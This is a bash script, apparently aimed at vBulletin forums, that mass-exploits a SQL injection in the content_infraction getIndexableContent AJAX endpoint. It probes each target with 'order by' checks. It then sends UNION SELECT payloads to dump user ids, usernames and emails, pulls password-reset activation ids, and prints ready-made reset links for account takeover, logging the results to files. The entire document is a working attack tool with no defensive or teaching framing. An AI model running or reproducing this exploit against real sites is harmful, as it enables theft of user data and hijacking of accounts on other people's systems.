#!/bin/bash

union=""
while true; do
	echo -en "\n[ip]> "; read ip

	# check
	res=$(curl -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d "nodeId[nodeid]=1||false#" "${ip}ajax/api/content_infraction/getIndexableContent" -ks -m 10)	

	echo -e "\n-----| result check |-----\n$res" | head -n 15
	#exclude html + grep param result
	if echo "$res" | head -n 5 | grep -q '"title"\|"note"\|"actionreason"\|"customreason"\|:null'; then
		echo -e "\n\t[*] $ip have vuln indication ..."
		
		# order by test
		echo -e "\t[*] do order by check ..."
		res=$(curl -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d "nodeId[nodeid]=1 order by 27 #" "${ip}ajax/api/content_infraction/getIndexableContent" -ks -m 10)
		if echo "$res" | grep -q '"title"\|"note"\|"actionreason"\|"customreason"\|:null'; then
			echo -e "\t[!] got 27"
			union="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(0x0a,userid,0x3d,0x3e,username,0x3d,0x3e,email),19,20,21,22,23,24,25,26,27"
		else
			echo -e "\t[!] got 26"
			union="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(0x0a,userid,0x3d,0x3e,username,0x3d,0x3e,email),19,20,21,22,23,24,25,26"
		fi

		# give previx table
		echo -en "\t[?] give previx name or pass : "
		read tprevix

		# send union payload
		res=$(curl -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d "nodeId[nodeid]=1 union select ${union} from ${tprevix}user #" "${ip}ajax/api/content_infraction/getIndexableContent" -ks -m 10)
		echo -e "\n-----| result dump |-----\n$res"
		
		# logs back
		if echo "$res" | grep -q '{"title":null,"rawtext":null}\|error'  || [[ -z "$res" ]] ; then
			echo -e "\n\t[-] gives false positive!"
			if ! grep -q "$ip" bek.txt; then
				echo -e "${ip}" >> bek.txt
			fi
			continue
		fi

		# logs output
		if ! grep -q "$ip" logs.txt; then
			echo -e "\n${ip}\n$res" >> logs.txt
		fi
		
		echo -en "\n[nom]> "
		read nom
		
		if echo "$union" | grep -q ",27"; then
			union="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(activationid,0x0a),19,20,21,22,23,24,25,26,27"
		else
			union="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(activationid,0x0a),19,20,21,22,23,24,25,26"
		fi

		res=$(curl -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d "nodeId[nodeid]=1 union select ${union} from ${tprevix}useractivation where userid=${nom} #" "${ip}ajax/api/content_infraction/getIndexableContent" -ks -m 10)
		
		# reset code
		token=$(echo "$res" | jq -r ".rawtext")
		if ! curl -Isk "${ip}reset-password?userid=${nom}&activationid=${token}" | grep -q "200"; then
			echo -e "\n-----| reset link |-----\n${ip}auth/lostpw/?action=pwreset&userid=${nom}&activationid=${token}"
		else
			echo -e "\n-----| reset link |-----\n${ip}reset-password?userid=${nom}&activationid=${token}"
		fi
		
	fi
done
